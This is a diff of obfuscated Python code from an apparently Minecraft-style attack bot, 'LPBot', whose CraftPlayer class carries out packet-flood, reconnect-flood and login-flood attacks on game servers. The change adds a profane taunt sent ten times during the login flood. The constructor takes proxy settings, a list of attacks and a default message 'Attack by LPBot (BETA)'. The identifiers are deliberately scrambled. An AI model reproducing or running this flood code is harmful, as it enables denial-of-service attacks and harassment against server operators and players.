@@ -285,7 +285,6 @@ class CraftPlayer :
                 if OOO0000OO0O0000OO =='pFlood':
                     OOO0000OO0O0000OO =0
                     OO0OOOO0O00O0OO00 ._socket .sendall ('\x01'+CraftString ('aaaaaaaaaaaaaaa;'+'a'*500 ))
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
                     OO0OOOO0O00O0OO00 ._socket .close ()
                 if OOO0000OO0O0000OO =='reconnectFlood':
                     OO0OOOO0O00O0OO00 ._socket .close ()
@@ -293,6 +292,16 @@ class CraftPlayer :
                 if OOO0000OO0O0000OO =='authFlood':
                     OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
                     OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
         except :
             pass
     def __init__ (OO0OO0O000OOOOO0O ,O00000O0O0O000000 ,password ='',protonum =210 ,proxy ='',server ='',hostx ='',portx ='',isOffline =False ,printchat =True ,debug =False ,attacks =[],prependFlood ='',msg ='Attack by LPBot (BETA)',count =5 ,callback =dummy ,eventHook =None ):
